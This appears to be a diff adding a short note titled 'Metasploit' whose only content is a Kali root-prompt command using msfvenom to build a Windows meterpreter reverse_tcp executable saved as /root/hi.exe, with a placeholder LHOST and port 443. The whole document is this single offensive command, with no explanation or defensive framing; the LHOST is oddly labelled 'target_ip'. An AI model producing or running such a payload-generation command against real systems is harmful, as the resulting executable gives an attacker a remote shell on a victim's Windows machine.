@@ -1,0 +1,3 @@
+Metasploit
+
+root@kali:~#    msfvenom -p windows/meterpreter/reverse_tcp LHOST=target_ip LPORT=443 -f exe > /root/hi.exe
